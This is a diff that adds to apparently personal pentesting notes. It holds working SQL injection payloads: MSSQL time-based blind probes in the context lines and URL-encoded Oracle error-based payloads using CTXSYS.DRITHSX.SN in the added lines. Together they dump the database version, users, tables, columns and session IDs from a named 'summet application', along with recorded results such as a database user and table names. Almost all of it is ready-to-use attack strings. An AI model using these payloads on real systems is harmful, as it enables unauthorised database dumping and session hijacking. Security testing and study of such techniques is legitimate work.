@@ -38,3 +38,14 @@ DB Name= 'IF(SUBSTRING(DB_NAME(),1,1))+>+'a'+WAITFOR+DELAY+'00:00:10'--
 Table Length= 'IF(LEN((SELECT+TOP+1+NAME+FROM+sysobjects+WHERE+xtype='U'))+>+1)+WAITFOR+DELAY+'00:00:10'--
 
 Table Name= 'IF(SUBSTRING((SELECT+TOP+1+NAME+FROM+sysobjects+WHERE+xtype='U'),1,1))+>+'a'+WAITFOR+DELAY+'00:00:10'--
+
+
+Oracle sql injection mannually database dump(summet application)--->(refrence https://grav3m1nd-byte.gitbook.io/htb-resources/oscp-study-material/learning-sql-injection-in-oracle-databases)
+'%20AND%201%3dCTXSYS.DRITHSX.SN(user,(select%20banner%20from%20v$version%20where%20rownum%3d1))--sdfdsfds
+'%20AND%201%3dCTXSYS.DRITHSX.SN(user,(select%20user%20from%20dual))--sdfdsfds
+'%20OR%201%3dCTXSYS.DRITHSX.SN(user,(SELECT%20username%20from(SELECT%20ROWNUM%20r,username%20from%20all_users%20order%20by%20username)%20WHERE%20r=1))--sdfdsfds
+'%20OR%201%3dCTXSYS.DRITHSX.SN(user,(SELECT%20table_name%20from(SELECT%20ROWNUM%20r,table_name%20from%20all_tables%20where%20table_name%20LIKE%20'%USER%'%20order%20by%20table_name)%20WHERE%20r=1))--sdfdsfds
+'%20OR%201%3dCTXSYS.DRITHSX.SN(user,(SELECT%20column_name%20from(SELECT%20ROWNUM%20r,column_name%20from%20all_tab_columns%20where%20table_name%20%3d%20'USER_PRIVILEGE_MAP')%20WHERE%20r=1))--sdfdsfds
+user= NOTIVADU
+table name=USER_PRIVILEGE_MAP	SDO_PREFERRED_OPS_USER  I_USERSESSIONLOG_
+'%20OR%201%3dCTXSYS.DRITHSX.SN(user,(SELECT%20SESSIONID%20from(SELECT%20ROWNUM%20r,SESSIONID%20from%20I_USERSESSIONLOG_%20ORDER%20BY%20SRNO)%20WHERE%20r=1))--sdfdsfds
